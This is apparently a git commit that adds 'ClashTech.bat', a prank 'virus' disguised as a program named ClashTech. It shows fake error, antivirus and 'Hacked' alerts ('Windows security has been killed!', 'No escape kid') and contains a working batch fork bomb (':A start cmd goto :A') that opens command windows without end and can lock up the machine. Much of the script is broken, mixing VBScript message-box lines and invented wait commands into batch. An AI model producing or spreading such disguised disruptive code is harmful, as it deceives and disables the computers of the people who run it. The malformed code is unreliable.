6818c3bdb779d2489ea5e49743090068bde68f8f
DavidSpaiuc123 <154270895+DavidSpaiuc123@users.noreply.github.com>
2023-12-18 21:18:46 +0200

    idk
    idk

---
+++ clashtect.exe/ClashTech.bat
@@ -0,0 +1,46 @@
+X=MsgBox("There was a error while, openning clashtech",5+16,"ERROR") 
+wait (2)sec
+
+X=MsgBox("While, openning clashtect a virsus has been detected",1+16,"Anti-Virsus") 
+wait (2)sec
+
+X=MsgBox("Virsus activated",1+16,"Alert") 
+wait (1)sec
+
+X=MsgBox("Threat has been eliminated",1+16,"Succes") 
+wait(3)sec
+
+X=MsgBox("Windows security has been killed!",1+16,"High Alert") 
+
+@echo off
+:A
+start cmd
+goto :A
+
+X=MsgBox("No escape kid",1+16,"Hacked") 
+wait (2)sec
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
+X=MsgBox("Message Description",0+16,"Title") 
+
